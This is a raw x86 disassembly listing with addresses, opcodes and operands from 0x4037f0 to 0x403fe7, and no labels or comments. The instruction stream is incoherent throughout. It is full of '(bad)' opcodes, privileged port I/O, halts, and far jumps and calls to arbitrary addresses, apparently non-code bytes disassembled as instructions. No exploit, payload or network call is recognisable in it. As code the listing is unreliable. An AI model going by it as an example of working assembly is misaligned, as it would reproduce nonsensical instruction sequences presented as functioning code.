  4037f0:	dec    edx
  4037f1:	jbe    0x4037c6
  4037f3:	jl     0x40385a
  4037f5:	cmp    edx,DWORD PTR ds:0x7d74f6ac
  4037fb:	adc    DWORD PTR [esi-0x7b],0x5a4cdec
  403802:	push   0xfc426cb3
  403807:	and    eax,0xd5342a80
  40380c:	sub    eax,0xbd7f19d6
  403811:	mov    esp,0xc78f033f
  403816:	cmp    BYTE PTR [ebp+0xf],ch
  403819:	mov    ebx,0x2a769ebd
  40381e:	or     eax,DWORD PTR [eax]
  403820:	mov    edi,0x932e3009
  403825:	imul   esi,DWORD PTR [esi-0x35],0xffffff85
  403829:	add    ecx,ecx
  40382b:	cli    
  40382c:	cmp    BYTE PTR [edi],bh
  40382e:	jae    0x403858
  403830:	mov    esi,0xac3d22fb
  403835:	pusha  
  403836:	loop   0x4037d0
  403838:	fcmovnbe st,st(1)
  40383a:	fnstsw WORD PTR [edx-0x26]
  40383d:	sub    al,0x23
  40383f:	and    eax,0x69c3253d
  403844:	or     BYTE PTR [eax-0x546ff60b],bl
  40384a:	jmp    0xf313:0x69c6b9c5
  403851:	stc    
  403852:	push   edi
  403853:	and    ch,dh
  403855:	mov    dl,0xe9
  403857:	sbb    al,0xdc
  403859:	pop    ebx
  40385a:	arpl   WORD PTR [esi+edi*4],bp
  40385d:	out    0xd9,eax
  40385f:	aam    0xfb
  403861:	or     esp,0x253cad3e
  403867:	aam    0xbb
  403869:	jb     0x4037ed
  40386b:	or     ch,BYTE PTR ds:0xf6f3ec1a
  403871:	fistp  WORD PTR [ecx+0x1b]
  403874:	add    BYTE PTR [ebp+0x15],dl
  403877:	mov    ds:0x44206fa5,al
  40387c:	in     al,0xe3
  40387e:	hlt    
  40387f:	(bad)  
  403881:	xor    DWORD PTR [ebx+edi*2+0x27],0xffffff94
  403886:	lea    ecx,[esi]
  403888:	mov    ecx,0xec2c5814
  40388d:	(bad)  
  40388f:	jno    0x403858
  403891:	sbb    bh,al
  403893:	pop    esp
  403894:	cs hlt 
  403896:	adc    BYTE PTR [ecx-0x5f401042],al
  40389c:	mov    ebp,0x36dda245
  4038a1:	dec    esp
  4038a2:	mov    ebx,0x551d057c
  4038a7:	and    ebp,DWORD PTR [edx+esi*2+0x25c4937e]
  4038ae:	retf   0xfd0d
  4038b1:	adc    edx,DWORD PTR [ecx-0x5a]
  4038b4:	fadd   DWORD PTR [eax]
  4038b6:	je     0x4038c2
  4038b8:	jecxz  0x403856
  4038ba:	nop
  4038bb:	jg     0x4038dc
  4038bd:	cwde   
  4038be:	movq   QWORD PTR [edx-0x76022b32],mm4
  4038c5:	mov    dl,0x6e
  4038c7:	jae    0x4038bd
  4038c9:	je     0x40386d
  4038cb:	imul   edi,DWORD PTR [ecx+0x30c4008c],0xa9ef554d
  4038d5:	add    esp,ebp
  4038d7:	mov    dh,0x7e
  4038d9:	adc    al,0x4c
  4038db:	scas   al,BYTE PTR es:[edi]
  4038dc:	pop    ecx
  4038dd:	mov    ecx,0x189dc02a
  4038e2:	push   eax
  4038e3:	push   edx
  4038e4:	sub    eax,DWORD PTR [edx+0x3eb698a6]
  4038ea:	mov    eax,ds:0xbc10a659
  4038ef:	pop    edx
  4038f0:	enter  0xfb06,0x59
  4038f4:	stos   BYTE PTR es:[edi],al
  4038f5:	mov    DWORD PTR [eax],0x3e98b93f
  4038fb:	mov    edi,0xf73d3919
  403900:	add    al,BYTE PTR [ecx-0x5]
  403903:	or     al,0x30
  403905:	sbb    dl,dl
  403907:	icebp  
  403908:	or     cl,dl
  40390a:	or     al,bh
  40390c:	sbb    eax,0x9913c054
  403911:	jmp    0x57983a30
  403916:	sbb    BYTE PTR [esi+0xde3b32f],bh
  40391c:	pop    esp
  40391d:	mov    edi,DWORD PTR ds:0xbca0da7c
  403923:	ror    BYTE PTR [ecx+0x18],cl
  403926:	lahf   
  403927:	mov    esp,DWORD PTR [eax+0x57]
  40392a:	int3   
  40392b:	cmp    esi,DWORD PTR [ebx+ebx*1]
  40392e:	mov    ebx,0x18bd2955
  403933:	into   
  403934:	adc    eax,0x1c098e1a
  403939:	cmp    eax,0x65d5e052
  40393e:	cdq    
  40393f:	pop    eax
  403940:	inc    eax
  403941:	cmp    edx,edi
  403943:	fsub   DWORD PTR [ecx+0x67066cca]
  403949:	mov    ds:0x9b333a3d,eax
  40394e:	and    DWORD PTR [eax],esi
  403950:	out    0x8b,eax
  403952:	fild   DWORD PTR [ecx]
  403954:	sub    ch,BYTE PTR [ebx+0x38]
  403957:	or     eax,0x3574f82a
  40395c:	mov    ebx,DWORD PTR [ebp+0x75c67c9c]
  403962:	rol    BYTE PTR [ebx-0x36],cl
  403965:	jle    0x4039b1
  403967:	repz xchg edx,eax
  403969:	pusha  
  40396a:	ins    BYTE PTR es:[edi],dx
  40396b:	dec    esp
  40396c:	fsubr  QWORD PTR [ebx+0x75]
  40396f:	loop   0x403998
  403971:	dec    edi
  403972:	jne    0x403966
  403974:	xchg   esp,eax
  403975:	sub    dl,bl
  403977:	lea    eax,[edi-0x5cbc3971]
  40397d:	dec    ecx
  40397e:	dec    edx
  40397f:	ret    0x8fd3
  403982:	jnp    0x4039a2
  403984:	push   ss
  403985:	push   ss
  403986:	jns    0x4039ba
  403988:	loop   0x40393a
  40398a:	or     edx,DWORD PTR [ebp+0x26]
  40398d:	adc    BYTE PTR [ecx+eax*4-0x4dd1ab24],0x22
  403995:	pop    eax
  403996:	add    DWORD PTR [ebx],edi
  403998:	pop    edx
  403999:	xchg   edi,eax
  40399a:	sub    al,0x8
  40399c:	lock add BYTE PTR [edi+ebx*1-0x21e88b50],ch
  4039a4:	ja     0x4039af
  4039a6:	xor    al,0x1
  4039a8:	dec    ecx
  4039a9:	(bad)  
  4039aa:	xchg   esp,eax
  4039ab:	pop    edx
  4039ac:	(bad)  
  4039ae:	data16 cmp bl,ah
  4039b1:	inc    esp
  4039b2:	out    dx,eax
  4039b3:	pop    ebx
  4039b4:	(bad)  
  4039b5:	dec    esp
  4039b6:	dec    esi
  4039b7:	test   al,0xaa
  4039b9:	call   0xb94023c6
  4039be:	xchg   bh,bl
  4039c0:	and    BYTE PTR [eax+eiz*1-0x6a0d8257],0x68
  4039c8:	mov    ds:0xd17846ec,eax
  4039cd:	and    BYTE PTR ds:[edx-0x35],0x7b
  4039d2:	not    ecx
  4039d4:	sub    bh,BYTE PTR [ebp+ebp*1-0x7f90c45d]
  4039db:	test   eax,0x11a9d84c
  4039e0:	shl    BYTE PTR ds:0x181fcdd5,cl
  4039e6:	mov    ds:0xa1e3fa48,ax
  4039ec:	sbb    esp,DWORD PTR ds:0xae53ff6f
  4039f2:	pop    esi
  4039f3:	push   ebp
  4039f4:	(bad)  
  4039f5:	lock xor eax,0x6a43d8aa
  4039fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039fc:	jecxz  0x403a63
  4039fe:	mov    cl,0xa3
  403a00:	xchg   ebx,eax
  403a01:	scas   eax,DWORD PTR es:[edi]
  403a02:	jo     0x403a1c
  403a04:	jo     0x403a28
  403a06:	mov    dl,0xb9
  403a08:	icebp  
  403a09:	dec    esp
  403a0a:	ss pop ebx
  403a0c:	sub    DWORD PTR [ebp-0x70],ebx
  403a0f:	nop
  403a10:	(bad)  
  403a11:	sbb    DWORD PTR [esi],edx
  403a13:	dec    eax
  403a14:	out    dx,eax
  403a15:	dec    esi
  403a16:	lea    esi,[ebp-0x13eaaf37]
  403a1c:	out    0x5b,eax
  403a1e:	out    dx,eax
  403a1f:	jae    0x403a99
  403a21:	je     0x4039d4
  403a23:	jns    0x403a22
  403a25:	ins    DWORD PTR es:[edi],dx
  403a26:	jmp    0x403a8a
  403a28:	inc    eax
  403a29:	cmp    BYTE PTR [eax],cl
  403a2b:	shl    DWORD PTR [eax-0x5479c5be],cl
  403a31:	mov    edi,0x9a42abe9
  403a36:	or     ebx,DWORD PTR [edx-0x352e79ad]
  403a3c:	mov    edi,0x26360f16
  403a41:	icebp  
  403a42:	sub    BYTE PTR [ecx],al
  403a44:	fnsave [ebx+0x79130b4e]
  403a4a:	xchg   edx,eax
  403a4b:	adc    bl,BYTE PTR [edi+ebp*2+0x34e9fe26]
  403a52:	jmp    0xfefb384b
  403a57:	cli    
  403a58:	pop    edi
  403a59:	test   esp,esp
  403a5b:	jge    0x4039f7
  403a5d:	cmp    BYTE PTR [eax],0xe7
  403a60:	mov    ebp,0xd94099f0
  403a65:	add    esp,esi
  403a67:	jg     0x403aaa
  403a69:	or     eax,0x5000cc95
  403a6e:	xor    DWORD PTR [edi-0x6664a3fe],esi
  403a74:	cmp    cl,al
  403a76:	and    ch,BYTE PTR [edx-0x26]
  403a79:	push   eax
  403a7a:	stos   BYTE PTR es:[edi],al
  403a7b:	push   edi
  403a7c:	or     ch,bh
  403a7e:	xor    esi,esi
  403a80:	add    ah,BYTE PTR [edx+0x473a316a]
  403a86:	outs   dx,BYTE PTR ds:[si]
  403a88:	jl     0x403acb
  403a8a:	mov    dh,0x27
  403a8c:	sbb    ah,dh
  403a8e:	push   ds
  403a8f:	push   edi
  403a90:	sbb    BYTE PTR [ebp-0x23],bh
  403a93:	inc    ebp
  403a94:	cmp    ah,0xc
  403a97:	sbb    BYTE PTR [edi+0x2e],0xdc
  403a9b:	push   edx
  403a9c:	(bad)  
  403a9d:	leave  
  403a9e:	add    dh,BYTE PTR [ebp-0x1]
  403aa1:	lods   eax,DWORD PTR ds:[esi]
  403aa2:	push   ebx
  403aa3:	inc    ebp
  403aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa5:	lods   eax,DWORD PTR ds:[esi]
  403aa6:	lea    esi,[esi-0x2432828f]
  403aac:	popf   
  403aad:	clc    
  403aae:	xor    eax,0x82b5b5b0
  403ab3:	imul   BYTE PTR [ebx]
  403ab5:	(bad)  
  403ab6:	out    0xe2,eax
  403ab8:	mov    DWORD PTR [edx+0x35e5b6bb],edx
  403abe:	inc    ebx
  403abf:	mov    dh,0x54
  403ac1:	arpl   WORD PTR [ecx],di
  403ac3:	or     edi,DWORD PTR ds:0x81f6487e
  403ac9:	ror    BYTE PTR [ecx+0x54e51b17],cl
  403acf:	fsin   
  403ad1:	jne    0x403b2d
  403ad3:	ret    
  403ad4:	pop    ds
  403ad5:	xchg   edx,eax
  403ad6:	sub    al,0x6d
  403ad8:	xor    ah,al
  403ada:	cs ins BYTE PTR es:[edi],dx
  403adc:	mov    cl,0xca
  403ade:	int3   
  403adf:	add    eax,0xddd7cfe4
  403ae4:	jmp    FWORD PTR [edi]
  403ae6:	mov    esp,0x30a78c50
  403aeb:	or     al,0xf9
  403aed:	mov    edi,0x5f399929
  403af2:	dec    ebp
  403af3:	mov    esp,0x5459ca15
  403af8:	neg    bl
  403afa:	shl    DWORD PTR [edi+0x825f507],1
  403b00:	push   0xed2d6f50
  403b05:	cmp    al,0x6f
  403b07:	or     dl,BYTE PTR [esi-0x10]
  403b0a:	and    ebx,DWORD PTR [esi]
  403b0c:	sub    al,0x8e
  403b0e:	push   ecx
  403b0f:	(bad)  
  403b10:	div    BYTE PTR [ecx-0x7d]
  403b13:	call   0x76e9:0xb4f74ba0
  403b1a:	cmp    DWORD PTR [ebx+0x352db250],esi
  403b20:	loop   0x403aee
  403b22:	jns    0x403b9c
  403b24:	outs   dx,DWORD PTR ds:[esi]
  403b25:	aaa    
  403b26:	xor    al,0x41
  403b28:	out    dx,eax
  403b29:	lea    esp,[ebx+0x6c]
  403b2c:	push   es
  403b2d:	sahf   
  403b2e:	pop    esp
  403b2f:	inc    esp
  403b30:	daa    
  403b31:	test   eax,0xfa2de9d9
  403b36:	daa    
  403b37:	add    ah,al
  403b39:	outs   dx,BYTE PTR ds:[esi]
  403b3a:	mov    ah,ch
  403b3c:	cdq    
  403b3d:	xchg   esi,eax
  403b3e:	aad    0x88
  403b40:	jl     0x403b17
  403b42:	(bad)  
  403b44:	jae    0x403bbd
  403b46:	gs aas 
  403b48:	(bad)  [esi-0x35]
  403b4b:	test   cl,0xb1
  403b4e:	test   eax,0xa0019022
  403b53:	or     bl,BYTE PTR [ebp+0x55]
  403b56:	int3   
  403b57:	sbb    eax,0xad5267db
  403b5c:	gs jmp 0x403bbd
  403b5f:	xchg   edi,eax
  403b60:	mov    al,0xcc
  403b62:	scas   al,BYTE PTR es:[edi]
  403b63:	jo     0x403b88
  403b65:	adc    DWORD PTR [esi+0x6146c7fa],eax
  403b6b:	adc    DWORD PTR [ecx],ebp
  403b6d:	jnp    0x403b85
  403b6f:	sti    
  403b70:	js     0x403b7a
  403b72:	or     DWORD PTR [esi],edx
  403b74:	add    DWORD PTR [ecx],edi
  403b76:	push   ebx
  403b77:	pop    ebp
  403b78:	pop    esp
  403b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b7a:	push   0x8d887d78
  403b7f:	sbb    al,0x45
  403b81:	cs pop edx
  403b84:	fld1   
  403b86:	outs   dx,DWORD PTR ds:[esi]
  403b87:	pop    eax
  403b88:	adc    esp,eax
  403b8a:	rcl    BYTE PTR ds:0xefd15578,0x89
  403b91:	mov    al,0x27
  403b93:	sar    BYTE PTR [eax],0x3
  403b96:	mov    eax,0xdcc24661
  403b9b:	inc    ecx
  403b9c:	xchg   BYTE PTR [edi],al
  403b9e:	and    BYTE PTR [esi-0x6c],dl
  403ba1:	xor    ch,cl
  403ba3:	(bad)  
  403ba4:	sbb    eax,0xd71bddb3
  403ba9:	mov    edx,DWORD PTR [edi-0x66]
  403bac:	popa   
  403bad:	mov    ch,0xaa
  403baf:	push   0x19709abc
  403bb4:	sbb    DWORD PTR [ecx*8-0x72353ce5],edx
  403bbb:	fld    QWORD PTR [esi+0x5d]
  403bbe:	std    
  403bbf:	aam    0xa1
  403bc1:	cs pop eax
  403bc3:	call   0x896351b8
  403bc8:	push   ds
  403bc9:	mov    dh,0xa6
  403bcb:	shl    DWORD PTR [ebx],1
  403bcd:	aaa    
  403bce:	shr    DWORD PTR fs:[ecx-0x7d7c7486],0x8e
  403bd6:	iret   
  403bd7:	pop    edi
  403bd8:	mov    fs,WORD PTR [esi]
  403bda:	sub    eax,DWORD PTR [esi-0x57aefded]
  403be0:	jecxz  0x403c30
  403be2:	xor    bh,ch
  403be4:	inc    esi
  403be5:	inc    esp
  403be6:	sahf   
  403be7:	(bad)  
  403be8:	das    
  403be9:	test   DWORD PTR [esi],ecx
  403beb:	dec    esi
  403bec:	lods   al,BYTE PTR ds:[esi]
  403bed:	cmp    bh,BYTE PTR [eax-0x46]
  403bf0:	and    DWORD PTR [edx+0x2bf4ddda],0x5fe94109
  403bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bfb:	ds mov bh,0x5b
  403bfe:	adc    al,0x6b
  403c00:	dec    ebp
  403c01:	cli    
  403c02:	js     0x403bf2
  403c04:	icebp  
  403c05:	ins    BYTE PTR es:[edi],dx
  403c06:	pop    esi
  403c07:	cmp    al,0x63
  403c09:	into   
  403c0a:	xchg   ebp,eax
  403c0b:	dec    ebp
  403c0c:	mov    ecx,0x4d03ae32
  403c11:	(bad)
  403c14:	in     eax,0x94
  403c16:	in     al,dx
  403c17:	mov    ah,0x7
  403c19:	jne    0x403c5f
  403c1b:	jmp    0x403c7d
  403c1d:	data16 and BYTE PTR [esi+0x1f],ch
  403c21:	ds in  al,0xd1
  403c24:	mov    edx,0x820c146e
  403c29:	cdq    
  403c2a:	sbb    DWORD PTR [ebx],0xfffffff4
  403c2d:	push   ecx
  403c2e:	aam    0xfb
  403c30:	jl     0x403c8b
  403c32:	enter  0x9bc1,0x39
  403c36:	push   ebp
  403c37:	dec    ebp
  403c38:	mov    dl,0xb9
  403c3a:	nop
  403c3b:	xchg   ebx,eax
  403c3c:	stos   DWORD PTR es:[edi],eax
  403c3d:	or     eax,0x5c2fee52
  403c42:	push   0xffffffba
  403c44:	inc    eax
  403c45:	or     BYTE PTR [edx],ah
  403c47:	rep ins BYTE PTR es:[edi],dx
  403c49:	aam    0xe6
  403c4b:	mov    DWORD PTR [ebx],eax
  403c4d:	div    edx
  403c4f:	adc    ah,ah
  403c51:	rol    DWORD PTR es:[edi],1
  403c54:	pop    edi
  403c55:	adc    esi,edx
  403c57:	in     al,dx
  403c58:	and    DWORD PTR [esi-0x4f209745],ecx
  403c5e:	sbb    dh,BYTE PTR [eax+0x5869335]
  403c64:	cmc    
  403c65:	(bad)  
  403c66:	stc    
  403c67:	cmp    ebx,DWORD PTR [ebx+0x8a17eb1]
  403c6d:	xchg   edi,eax
  403c6e:	(bad)  
  403c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c70:	clc    
  403c71:	cmp    DWORD PTR [esi+0x30],esp
  403c74:	and    DWORD PTR [eax],esp
  403c76:	rcr    BYTE PTR [ebx],0x1a
  403c79:	std    
  403c7a:	push   ecx
  403c7b:	ret    0x935d
  403c7e:	or     eax,0xfb0bbf65
  403c83:	cli    
  403c84:	retf   
  403c85:	xchg   DWORD PTR [ecx-0x1c],ebp
  403c88:	pop    ebx
  403c89:	mov    dh,0x33
  403c8b:	mov    ebx,0x47e2bcca
  403c90:	cmp    ebp,DWORD PTR [edx-0x7f50424d]
  403c96:	or     bh,bh
  403c98:	push   ebp
  403c99:	scas   eax,DWORD PTR es:[edi]
  403c9a:	ins    BYTE PTR es:[edi],dx
  403c9b:	lock int 0x43
  403c9e:	sub    eax,0x8143ae23
  403ca3:	jae    0x403cc7
  403ca5:	lea    esp,[ebx+0x6ef1ec3f]
  403cab:	ret    
  403cac:	shl    BYTE PTR [eax+0x49],1
  403caf:	fldenv [ebx-0x5c773e7e]
  403cb5:	bound  ebx,QWORD PTR [eax]
  403cb7:	push   edx
  403cb8:	sub    bh,BYTE PTR ds:0x7e73ab1f
  403cbe:	pushf  
  403cbf:	or     DWORD PTR [eax-0x3014c57d],esp
  403cc5:	push   es
  403cc6:	mov    cl,0xc3
  403cc8:	clc    
  403cc9:	popa   
  403cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ccb:	out    0x45,al
  403ccd:	fdiv   DWORD PTR [esi+0x9]
  403cd0:	inc    esi
  403cd1:	pop    ebx
  403cd2:	mov    bh,0xaa
  403cd4:	(bad)  
  403cd5:	outs   dx,BYTE PTR ds:[esi]
  403cd6:	addr16 push eax
  403cd8:	les    ebx,FWORD PTR [ebx-0x60]
  403cdb:	add    eax,0x2b682c2b
  403ce0:	in     al,dx
  403ce1:	sbb    esi,ecx
  403ce3:	pop    ebp
  403ce4:	mov    esi,0x8bbaa81a
  403ce9:	add    al,0x98
  403ceb:	aas    
  403cec:	lahf   
  403ced:	push   cs
  403cee:	imul   esp,ebx,0x467762d2
  403cf4:	ficomp DWORD PTR [esi+ebp*8+0x77]
  403cf8:	sar    BYTE PTR [ecx+0xa4bdf56],cl
  403cfe:	xchg   ebx,eax
  403cff:	shl    bh,0x1c
  403d02:	fs das 
  403d04:	shl    BYTE PTR [edi],1
  403d06:	inc    BYTE PTR [edx-0x28]
  403d09:	xchg   BYTE PTR [ebx+0x7f],dh
  403d0c:	pop    edi
  403d0d:	into   
  403d0e:	mov    ah,0x61
  403d10:	int    0xa6
  403d12:	or     DWORD PTR [edi+ebx*1-0x51],ecx
  403d16:	test   al,0x95
  403d18:	lea    eax,[edi-0x609600ca]
  403d1e:	mov    ebp,0x53005daf
  403d23:	cmp    eax,0x14ec7419
  403d28:	mov    ecx,0x7df27294
  403d2d:	or     ebp,DWORD PTR [edi-0x6456e3e4]
  403d33:	bound  esp,QWORD PTR [edi-0x39]
  403d36:	shr    dl,cl
  403d38:	jp     0x403d62
  403d3a:	xchg   ch,ah
  403d3c:	rcl    esp,0xce
  403d3f:	pop    esp
  403d40:	mov    ebp,0xb8386b7
  403d45:	clc    
  403d46:	xor    al,0x5d
  403d48:	mov    ds:0xfed9b7bb,eax
  403d4d:	push   ebx
  403d4e:	jmp    FWORD PTR [ecx-0x24]
  403d51:	stc    
  403d52:	dec    ebp
  403d53:	mov    esi,0xa97c713e
  403d58:	sub    dh,BYTE PTR [edi]
  403d5a:	test   al,0x5d
  403d5c:	data16 mov WORD PTR [eax-0x3],?
  403d60:	sbb    BYTE PTR [eax+edx*4+0x35e0f306],ch
  403d67:	call   0xfb515d25
  403d6c:	adc    DWORD PTR [esi+esi*1+0x59],eax
  403d70:	out    dx,al
  403d71:	jbe    0x403d53
  403d73:	and    al,0xa
  403d75:	mov    ebx,0x33a641af
  403d7a:	sub    BYTE PTR [edx+ebx*8-0x2712bac0],bl
  403d81:	adc    eax,0xfe3d9165
  403d86:	jmp    0x1b8a:0xf389d5d6
  403d8d:	inc    edi
  403d8e:	imul   BYTE PTR [edi+0x1701d4ab]
  403d94:	xor    esi,ecx
  403d96:	loop   0x403dfe
  403d98:	pop    esi
  403d99:	push   ss
  403d9a:	mov    ch,0xc
  403d9c:	out    0xa2,eax
  403d9e:	mov    bl,0xd0
  403da0:	or     eax,0x2faddd18
  403da5:	test   al,0x74
  403da7:	pop    es
  403da8:	and    cl,BYTE PTR [esi-0x713e67ca]
  403dae:	sub    BYTE PTR [eax],bh
  403db0:	cmp    eax,0x7f31ff8d
  403db5:	pusha  
  403db6:	dec    ebx
  403db7:	mov    ?,WORD PTR ds:0xa3d9322c
  403dbd:	imul   eax,DWORD PTR [eax-0x27],0x4d
  403dc1:	sub    al,0x78
  403dc3:	jae    0x403dc8
  403dc5:	cmc    
  403dc6:	fcomp  DWORD PTR ds:0x26ce38c5
  403dcc:	lahf   
  403dcd:	ficom  DWORD PTR [ebx-0x6a58626d]
  403dd3:	pop    ds
  403dd4:	pop    ebp
  403dd5:	stos   BYTE PTR es:[edi],al
  403dd6:	or     ecx,DWORD PTR [edx-0x4fd3430]
  403ddc:	cli    
  403ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dde:	sar    DWORD PTR [eax],1
  403de0:	icebp  
  403de1:	repnz scas eax,DWORD PTR es:[edi]
  403de3:	loop   0x403e5b
  403de5:	pop    edx
  403de6:	jmp    0xf759:0x2e59a28f
  403ded:	and    al,0x4b
  403def:	mov    dl,0x1e
  403df1:	pop    es
  403df2:	dec    eax
  403df3:	push   ebx
  403df4:	lods   al,BYTE PTR ds:[esi]
  403df5:	arpl   sp,cx
  403df7:	loope  0x403e3d
  403df9:	jns    0x403e5c
  403dfb:	jb     0x403e35
  403dfd:	mov    ecx,0xe175eb37
  403e02:	jp     0x403de2
  403e04:	aaa    
  403e05:	sbb    DWORD PTR [ecx-0x5c],esp
  403e08:	cli    
  403e09:	or     DWORD PTR [edx],edi
  403e0b:	js     0x403dde
  403e0d:	popf   
  403e0e:	ss pop eax
  403e10:	retf   0x37fa
  403e13:	and    BYTE PTR [ebx-0x56a3187a],dh
  403e19:	add    eax,DWORD PTR [ebp+0x3e3c05fe]
  403e1f:	ins    BYTE PTR es:[edi],dx
  403e20:	cmp    dh,BYTE PTR [ebx+0x42]
  403e23:	pop    es
  403e24:	les    esi,FWORD PTR [esi+0x24fc6346]
  403e2a:	add    edi,DWORD PTR [esi+edi*1+0x57]
  403e2e:	in     al,0x67
  403e30:	xchg   esp,eax
  403e31:	sub    dl,BYTE PTR ds:0xf8261438
  403e37:	pop    edx
  403e38:	xor    eax,0xfe07bd3a
  403e3d:	mov    bh,0xdc
  403e3f:	ret    
  403e40:	or     bl,ah
  403e42:	out    0x6b,al
  403e44:	cmp    ch,BYTE PTR ds:0x2a0f8477
  403e4a:	mov    esp,DWORD PTR [eax-0x4907af7f]
  403e50:	outs   dx,DWORD PTR ds:[esi]
  403e51:	sti    
  403e52:	dec    esi
  403e53:	add    al,0x47
  403e55:	jmp    0x7f7835c2
  403e5a:	repz mov eax,0x3f28cc34
  403e60:	std    
  403e61:	popa   
  403e62:	js     0x403eb6
  403e64:	pop    ds
  403e65:	lahf   
  403e66:	pop    ss
  403e67:	and    DWORD PTR [edi-0x5001f28d],esp
  403e6d:	stos   DWORD PTR es:[edi],eax
  403e6e:	sbb    DWORD PTR [edi+edi*1+0x51],eax
  403e72:	xchg   esi,eax
  403e73:	pop    es
  403e74:	in     eax,dx
  403e75:	xor    bh,ch
  403e77:	sbb    ah,dh
  403e79:	ja     0x403ed3
  403e7b:	shl    DWORD PTR [ebp+0x70e0dbdd],cl
  403e81:	cmc    
  403e82:	imul   eax,DWORD PTR [edi],0xa7e09ae6
  403e88:	push   cs
  403e89:	outs   dx,BYTE PTR ds:[esi]
  403e8a:	popf   
  403e8b:	inc    esp
  403e8c:	dec    esp
  403e8d:	and    al,BYTE PTR [ebx-0x607ed1d5]
  403e93:	sub    eax,0x86d33791
  403e98:	push   edx
  403e99:	aas    
  403e9a:	mov    ch,bl
  403e9c:	push   ebp
  403e9d:	jg     0x403e43
  403e9f:	push   ds
  403ea0:	add    DWORD PTR [edi+eiz*2],ebx
  403ea3:	mov    esp,0x4caa0039
  403ea8:	mov    bh,0x3f
  403eaa:	inc    ebx
  403eab:	add    edi,DWORD PTR [eax-0x1c]
  403eae:	pusha  
  403eaf:	scas   al,BYTE PTR es:[edi]
  403eb0:	mov    eax,0xf5cc9938
  403eb5:	ins    DWORD PTR es:[edi],dx
  403eb6:	cmp    al,BYTE PTR [edi+0x53b7eea3]
  403ebc:	addr16 sahf 
  403ebe:	imul   edx,DWORD PTR [edi-0x64],0x72
  403ec2:	sbb    edx,edx
  403ec4:	iret   
  403ec5:	jge    0x403f2c
  403ec7:	test   BYTE PTR [edx],0xd0
  403eca:	dec    edx
  403ecb:	ret    0xe95b
  403ece:	sbb    eax,0xd13c3e09
  403ed3:	repz call 0xc187a830
  403ed9:	xchg   esp,eax
  403eda:	aaa    
  403edb:	adc    DWORD PTR [esi+ebx*1-0x69],0xffffffec
  403ee0:	xchg   eax,esp
  403ee2:	push   0x5f5faab4
  403ee7:	(bad)  
  403ee8:	int    0x3
  403eea:	ret    
  403eeb:	sar    bh,1
  403eed:	jne    0x403f54
  403eef:	jmp    0xca0c34c6
  403ef4:	xchg   ebp,edi
  403ef6:	mov    edi,0x794833ec
  403efb:	push   0xb97dc44a
  403f00:	fstp   DWORD PTR [esp+edx*2+0x3b]
  403f04:	add    BYTE PTR [edx],dl
  403f06:	leave  
  403f07:	ret    0x702f
  403f0a:	mov    ds:0x8df085aa,eax
  403f0f:	icebp  
  403f10:	sub    DWORD PTR [ebx-0x7dbfc84e],0xffffffde
  403f17:	sbb    al,0x69
  403f19:	fs in  eax,dx
  403f1b:	sar    BYTE PTR [edx+0x3f065731],cl
  403f21:	(bad)  
  403f22:	push   ecx
  403f23:	sub    ah,0xd4
  403f26:	lock ins BYTE PTR es:[edi],dx
  403f28:	sti    
  403f29:	mov    al,BYTE PTR [esi]
  403f2b:	add    DWORD PTR [eax],0x15
  403f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2f:	jp     0x403f3e
  403f31:	pop    esi
  403f32:	rol    BYTE PTR [ecx+ebx*2],1
  403f35:	sub    DWORD PTR [ebp+0x126f0576],ebx
  403f3b:	enter  0xa33,0xec
  403f3f:	pusha  
  403f40:	ins    DWORD PTR es:[edi],dx
  403f41:	dec    esi
  403f42:	mov    BYTE PTR [ecx+0x7d3cd4bd],bh
  403f48:	xor    al,0x6c
  403f4a:	dec    eax
  403f4b:	je     0x403f34
  403f4d:	mov    esp,0x8a4f4da9
  403f52:	jmp    0x1438:0xf058f560
  403f59:	(bad)  
  403f5a:	jno    0x403fd3
  403f5c:	in     eax,0xc9
  403f5e:	pop    edx
  403f5f:	mov    ah,0x78
  403f61:	in     al,0xd2
  403f63:	and    esp,ebp
  403f65:	sti    
  403f66:	out    0xdd,al
  403f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f69:	push   cs
  403f6a:	shl    DWORD PTR [ebp-0x35299b4a],0x31
  403f71:	mov    ds,WORD PTR [edi]
  403f73:	stos   BYTE PTR es:[edi],al
  403f74:	fwait
  403f75:	scas   al,BYTE PTR es:[edi]
  403f76:	nop
  403f77:	enter  0x7ee9,0x7b
  403f7b:	and    eax,0xad0bad5b
  403f80:	jo     0x403f91
  403f82:	popf   
  403f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f84:	call   0xac68:0xd5f4cd86
  403f8b:	out    dx,al
  403f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f8d:	dec    ecx
  403f8e:	xor    BYTE PTR [eax],al
  403f90:	shl    BYTE PTR [esi+0x233d61d3],cl
  403f96:	push   0xffffffb5
  403f98:	dec    esi
  403f99:	jl     0x403fa0
  403f9b:	in     eax,dx
  403f9c:	mov    esp,0xedae537b
  403fa1:	gs jo  0x403f57
  403fa4:	fwait
  403fa5:	das    
  403fa6:	push   ecx
  403fa7:	ret    
  403fa8:	dec    eax
  403fa9:	sub    BYTE PTR [eax],0xe0
  403fac:	pop    ss
  403fad:	retf   
  403fae:	inc    ebp
  403faf:	sbb    eax,0xd0e76f09
  403fb4:	call   0x51b23dcd
  403fb9:	and    DWORD PTR [eax-0x84fea97],ebx
  403fbf:	sbb    eax,esp
  403fc1:	scas   eax,DWORD PTR es:[edi]
  403fc2:	rep ins BYTE PTR es:[edi],dx
  403fc4:	mov    eax,ds:0x748d190
  403fc9:	ret    
  403fca:	xchg   ecx,eax
  403fcb:	in     al,dx
  403fcc:	fstp   DWORD PTR [eax+0x2b]
  403fcf:	inc    esp
  403fd0:	jl     0x403ff1
  403fd2:	(bad)  
  403fd3:	mov    esp,0x4f0aa72f
  403fd8:	jle    0x403fd1
  403fda:	sbb    al,0xc9
  403fdc:	mov    eax,ds:0x643cd1bc
  403fe1:	mov    ebx,0xf24b3bd2
  403fe6:	dec    ebx
  403fe7:	push   0x74
